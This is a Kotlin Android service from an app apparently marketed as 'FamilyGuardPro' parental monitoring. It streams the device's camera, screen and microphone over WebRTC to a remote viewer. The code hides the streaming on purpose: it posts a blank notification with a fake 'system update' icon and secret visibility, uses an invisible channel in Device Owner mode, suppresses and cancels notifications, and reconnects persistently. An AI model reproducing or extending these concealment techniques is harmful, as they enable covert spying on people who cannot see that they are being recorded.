package com.familyguardpro.services

import android.Manifest
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.IBinder
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.R
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import com.familyguardpro.webrtc.SignalingClient
import com.familyguardpro.webrtc.WebRTCClient
import kotlinx.coroutines.*
import org.webrtc.IceCandidate
import org.webrtc.PeerConnection
import org.webrtc.SessionDescription

/**
 * WebRTC Streaming Service
 * Handles camera, screen, and audio streaming via WebRTC
 */
class WebRTCStreamService : Service() {
    
    companion object {
        private const val TAG = "WebRTCStreamService"
        private const val NOTIFICATION_ID = 1010
        
        const val ACTION_START_CAMERA = "START_CAMERA"
        const val ACTION_START_SCREEN = "START_SCREEN"
        const val ACTION_START_AUDIO = "START_AUDIO"
        const val ACTION_START_ALL = "START_ALL" // Camera + Audio
        const val ACTION_STOP = "STOP"
        const val ACTION_SWITCH_CAMERA = "SWITCH_CAMERA"
        
        const val EXTRA_CAMERA_ID = "camera_id"
        
        // For MediaProjection result
        private var mediaProjectionResultCode: Int = 0
        private var mediaProjectionResultData: Intent? = null
        
        fun setMediaProjectionResult(resultCode: Int, data: Intent?) {
            mediaProjectionResultCode = resultCode
            mediaProjectionResultData = data
        }
    }
    
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var preferenceManager: PreferenceManager
    
    private var webRTCClient: WebRTCClient? = null
    private var signalingClient: SignalingClient? = null
    
    private var isStreaming = false
    private var currentStreamType = ""
    private var pendingIceCandidates = mutableListOf<IceCandidate>()
    private var isRemoteDescriptionSet = false
    private var connectionRetryCount = 0
    private val MAX_CONNECTION_RETRIES = 15 // More retries before giving up
    private var lastStreamType: StreamType? = null // For auto-reconnect
    
    override fun onCreate() {
        super.onCreate()
        preferenceManager = PreferenceManager(this)
        Log.d(TAG, "WebRTCStreamService created")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Determine stream type from action BEFORE calling startForeground
        // to ensure we use the correct foregroundServiceType from the manifest
        val actionType = when (intent?.action) {
            ACTION_START_CAMERA -> "camera"
            ACTION_START_SCREEN -> "screen"
            ACTION_START_AUDIO -> "audio"
            ACTION_START_ALL -> "camera_audio"
            else -> currentStreamType.ifEmpty { "camera" } // Default to camera (declared in manifest)
        }
        
        // CRITICAL: Always call startForeground() first to avoid
        // ForegroundServiceDidNotStartInTimeException
        currentStreamType = actionType
        startForeground(currentStreamType)
        
        when (intent?.action) {
            ACTION_START_CAMERA -> startWebRTCStream(StreamType.CAMERA)
            ACTION_START_SCREEN -> startWebRTCStream(StreamType.SCREEN)
            ACTION_START_AUDIO -> startWebRTCStream(StreamType.AUDIO)
            ACTION_START_ALL -> startWebRTCStream(StreamType.CAMERA_AND_AUDIO)
            ACTION_SWITCH_CAMERA -> webRTCClient?.switchCamera()
            ACTION_STOP -> {
                stopStreaming()
                stopSelf()
            }
        }
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        stopForeground(STOP_FOREGROUND_REMOVE)
        cancelAllNotifications()
        stopStreaming()
        serviceScope.cancel()
        Log.d(TAG, "WebRTCStreamService destroyed")
    }
    
    private fun cancelAllNotifications() {
        try {
            val nm = getSystemService(android.app.NotificationManager::class.java)
            nm.cancel(NOTIFICATION_ID)
            nm.cancelAll()
            for (id in 1001..1020) {
                try { nm.cancel(id) } catch (e: Exception) {}
            }
        } catch (e: Exception) {}
    }
    
    private fun startForeground(streamType: String) {
        // Check if Device Owner mode - use invisible channel
        val doManager = try {
            com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
        } catch (e: Exception) { null }
        
        val channelId = if (doManager?.isDeviceOwner() == true) {
            com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
            com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
        } else {
            FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING
        }
        
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_system_update)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
        
        val foregroundType = when (streamType) {
            "camera" -> android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            "screen" -> android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            "audio" -> android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            "camera_audio" -> android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or 
                              android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            else -> android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(NOTIFICATION_ID, notification, foregroundType)
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
        
        // Suppress notification in Device Owner mode
        com.familyguardpro.utils.NotificationUtils.suppressForegroundNotificationIfDeviceOwner(
            this, NOTIFICATION_ID
        )
    }
    
    private enum class StreamType {
        CAMERA, SCREEN, AUDIO, CAMERA_AND_AUDIO
    }
    
    private fun startWebRTCStream(streamType: StreamType) {
        if (isStreaming) {
            Log.w(TAG, "Already streaming")
            return
        }
        
        // Check permissions
        if (streamType == StreamType.CAMERA || streamType == StreamType.CAMERA_AND_AUDIO) {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Camera permission not granted")
                stopSelf()
                return
            }
        }
        
        if (streamType == StreamType.AUDIO || streamType == StreamType.CAMERA_AND_AUDIO) {
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Audio permission not granted")
                stopSelf()
                return
            }
        }
        
        if (streamType == StreamType.SCREEN) {
            if (mediaProjectionResultCode == 0 || mediaProjectionResultData == null) {
                Log.e(TAG, "MediaProjection permission not granted")
                stopSelf()
                return
            }
        }
        
        isStreaming = true
        
        // Initialize WebRTC client
        webRTCClient = WebRTCClient(this, object : WebRTCClient.WebRTCListener {
            override fun onLocalDescription(sdp: SessionDescription) {
                Log.d(TAG, "Local SDP created, sending offer")
                signalingClient?.sendOffer(sdp)
            }
            
            override fun onIceCandidate(candidate: IceCandidate) {
                Log.d(TAG, "ICE candidate generated")
                signalingClient?.sendIceCandidate(candidate)
            }
            
            override fun onConnectionStateChanged(state: PeerConnection.PeerConnectionState) {
                Log.d(TAG, "Connection state: $state")
                when (state) {
                    PeerConnection.PeerConnectionState.CONNECTED -> {
                        Log.d(TAG, "WebRTC connected! Enabling adaptive quality...")
                        connectionRetryCount = 0
                        signalingClient?.sendStreamStarted()
                        // Auto-enable adaptive quality on successful connection
                        webRTCClient?.setQuality(WebRTCClient.Companion.StreamQuality.AUTO)
                    }
                    PeerConnection.PeerConnectionState.DISCONNECTED -> {
                        Log.w(TAG, "WebRTC disconnected - attempting recovery (retry $connectionRetryCount)")
                        // DON'T stop streaming - let adaptive quality handle degradation
                        // The WebRTCClient will do ICE restart internally
                        serviceScope.launch {
                            connectionRetryCount++
                            if (connectionRetryCount <= MAX_CONNECTION_RETRIES) {
                                val delay = minOf(connectionRetryCount * 2000L, 15000L)
                                Log.d(TAG, "Will attempt reconnection in ${delay}ms")
                                delay(delay)
                                if (isStreaming) {
                                    restartConnection()
                                }
                            } else {
                                Log.e(TAG, "Max retries exceeded but keeping stream alive at minimum quality")
                                // Reset counter to allow future recovery
                                connectionRetryCount = MAX_CONNECTION_RETRIES / 2
                            }
                        }
                    }
                    PeerConnection.PeerConnectionState.FAILED -> {
                        Log.e(TAG, "WebRTC connection FAILED - aggressive recovery")
                        serviceScope.launch {
                            connectionRetryCount++
                            if (connectionRetryCount <= MAX_CONNECTION_RETRIES) {
                                val delay = minOf(connectionRetryCount * 3000L, 20000L)
                                Log.d(TAG, "Connection failed, retrying in ${delay}ms (attempt $connectionRetryCount)")
                                delay(delay)
                                if (isStreaming) {
                                    restartConnection()
                                }
                            } else {
                                Log.e(TAG, "Max retries exceeded on FAILED state, trying fresh reconnect")
                                // Full restart as last resort
                                delay(5000)
                                if (isStreaming) {
                                    connectionRetryCount = 0
                                    restartConnection()
                                }
                            }
                        }
                    }
                    else -> {}
                }
            }
            
            override fun onError(error: String) {
                Log.e(TAG, "WebRTC error: $error")
            }
        })
        
        // Initialize WebRTC
        webRTCClient?.initialize()
        
        // Connect to signaling server
        val signalType = when (streamType) {
            StreamType.CAMERA, StreamType.CAMERA_AND_AUDIO -> "camera"
            StreamType.SCREEN -> "screen"
            StreamType.AUDIO -> "audio"
        }
        
        signalingClient = SignalingClient(
            serverUrl = ApiClient.BASE_URL,
            deviceId = preferenceManager.getDeviceId(),
            streamType = signalType,
            listener = object : SignalingClient.SignalingListener {
                override fun onConnected() {
                    Log.d(TAG, "Signaling connected")
                    
                    // Create peer connection
                    serviceScope.launch {
                        delay(500) // Give WebRTC time to initialize
                        webRTCClient?.createPeerConnection()
                        
                        delay(500)
                        
                        // Start media capture based on stream type
                        when (streamType) {
                            StreamType.CAMERA -> {
                                // Camera + Audio for video call experience
                                webRTCClient?.startCameraCapture()
                                webRTCClient?.startAudioCapture()
                            }
                            StreamType.SCREEN -> {
                                // Screen + Audio for full device capture
                                initMediaProjection()
                                webRTCClient?.startAudioCapture()
                            }
                            StreamType.AUDIO -> {
                                webRTCClient?.startAudioCapture()
                            }
                            StreamType.CAMERA_AND_AUDIO -> {
                                webRTCClient?.startCameraCapture()
                                webRTCClient?.startAudioCapture()
                            }
                        }
                        
                        // CRITICAL: Wait for capture to initialize and video track to be added
                        // Screen capture needs more time due to MediaProjection setup
                        delay(if (streamType == StreamType.SCREEN) 2000 else 1000)
                        
                        // Create and send offer
                        Log.d(TAG, "Creating offer after capture initialization")
                        webRTCClient?.createOffer()
                    }
                }
                
                override fun onDisconnected() {
                    Log.d(TAG, "Signaling disconnected")
                }
                
                override fun onRemoteSdp(sdp: SessionDescription) {
                    Log.d(TAG, "Remote SDP received")
                    webRTCClient?.setRemoteDescription(sdp)
                    isRemoteDescriptionSet = true
                    
                    // Process pending ICE candidates
                    pendingIceCandidates.forEach { candidate ->
                        webRTCClient?.addIceCandidate(candidate)
                    }
                    pendingIceCandidates.clear()
                }
                
                override fun onRemoteIceCandidate(candidate: IceCandidate) {
                    Log.d(TAG, "Remote ICE candidate received")
                    if (isRemoteDescriptionSet) {
                        webRTCClient?.addIceCandidate(candidate)
                    } else {
                        pendingIceCandidates.add(candidate)
                    }
                }
                
                override fun onParentJoined() {
                    Log.d(TAG, "Parent joined")
                }
                
                override fun onParentLeft() {
                    Log.d(TAG, "Parent left")
                    // Could pause streaming here if desired
                }
                
                override fun onError(error: String) {
                    Log.e(TAG, "Signaling error: $error")
                }
            }
        )
        
        signalingClient?.connect()
    }
    
    private fun initMediaProjection() {
        try {
            // Pass the media projection intent to WebRTC client
            // The ScreenCapturerAndroid will create the MediaProjection internally
            mediaProjectionResultData?.let { intent ->
                webRTCClient?.startScreenCapture(intent)
            } ?: run {
                Log.e(TAG, "MediaProjection intent is null")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize MediaProjection", e)
        }
    }
    
    private fun restartConnection() {
        Log.d(TAG, "Restarting WebRTC connection")
        
        // Reset state
        isRemoteDescriptionSet = false
        pendingIceCandidates.clear()
        
        // Re-create offer
        webRTCClient?.createOffer()
    }
    
    private fun stopStreaming() {
        Log.d(TAG, "Stopping streaming")
        isStreaming = false
        
        signalingClient?.sendStreamStopped()
        signalingClient?.disconnect()
        signalingClient = null
        
        webRTCClient?.stopCapture()
        webRTCClient?.release()
        webRTCClient = null
        
        pendingIceCandidates.clear()
        isRemoteDescriptionSet = false
    }
}
